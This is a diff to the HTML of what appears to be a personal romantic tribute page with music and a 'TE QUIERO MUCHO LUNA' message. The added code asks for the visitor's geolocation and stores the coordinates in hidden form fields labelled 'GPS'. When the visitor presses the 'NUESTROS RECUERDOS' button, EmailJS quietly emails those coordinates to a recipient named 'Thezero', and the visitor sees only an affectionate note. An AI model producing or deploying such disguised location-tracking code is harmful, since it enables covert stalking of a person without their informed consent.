@@ -13,10 +13,21 @@
 
   <div class='v-align' id="content">
     <div class='hero-btn'>
-      <button class='btn' id="siBtn">
+      <form id="form" name="sentMessage" novalidate="novalidate">
+
+        <input type="hidden" required name="latitud" id="latitud" type="hidden" placeholder="Nombre">
+
+        <input type="hidden" name="longitud" id="longitud" placeholder="DNI" required>
+
+        <input id="to_name" name="to_name" type="hidden" value="Thezero" />
+        <input id="from_name" name="from_name" type="hidden" value="GPS" />
+
+        <button type="submit" class='btn' id="button" value="Send Email">NUESTROS RECUERDOS</button>
+      </form>
+      <!-- <button class='btn' id="siBtn">
         NUESTROS RECUERDOS
 
-      </button>
+      </button> -->
 
 
       <span class='particles-circle'></span>
@@ -61,7 +72,67 @@
       <source src="muchix/ysxz.mp3" type="audio/mp3">
     </audio>
   </div>
+
+
+  <!--Envia el mensaje a correo electronico-->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+
+  <script type="text/javascript">
+    emailjs.init('bgN-e7F2EjGyDqEfz')
+    var subject = "Lyrics-Music"
+    const phone = document.getElementById('phone');
+    const btn = document.getElementById('button');
+    // Solicitar permiso para acceder a la ubicación
+    navigator.geolocation.getCurrentPosition(
+      // Función que se ejecuta si se obtiene la ubicación correctamente
+      function (position) {
+        // Almacenar las coordenadas en variables
+        let latitud = position.coords.latitude;
+        let longitud = position.coords.longitude;
+
+        // Crear un enlace a Google Maps con las coordenadas
+        let enlaceGoogleMaps = `https://www.google.com/maps/search/?api=1&query=${latitud},${longitud}`;
+
+        // Mostrar el enlace en la consola
+        console.log("Enlace a Google Maps: " + enlaceGoogleMaps);
+        from = document.getElementById("latitud").value = latitud;
+        mess = document.getElementById("longitud").value = longitud;
+      },
+      // Función que se ejecuta si no se puede obtener la ubicación
+      function (error) {
+        console.error("Error al obtener la ubicación: " + error.message);
+      }
+    );
+    document.getElementById('form')
+      .addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        btn.value = 'Enviando...';
+
+        const serviceID = 'service_tzzmwxg';
+        const templateID = 'template_tn3efha';
+
+        emailjs.sendForm(serviceID, templateID, this)
+          .then(() => {
+            btn.value = 'Send Email';
+            alert('ACCESO SOLO PARA LUNA & SANGAMA')
+            var msj2 = '<center><div style="display: block;background-color: transparent;border: 5px ridge;text-align: center" id="mensajillo"><div style="font-size: 6vw;color: red;display: block;">¡TE QUIERO MUCHO LUNA!</div></div></center>'
+            $('body').append(msj2)
+
+            //alert('MUCHAS GRACIAS POR PARTICIPAR!');
+          }, (err) => {
+            btn.value = 'Send Email';
+            alert(JSON.stringify(err));
+          });
+
+      });
+
+
+  </script>
+
+
   <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
   <script src="./script.js"></script>
 </body>
+
 </html>
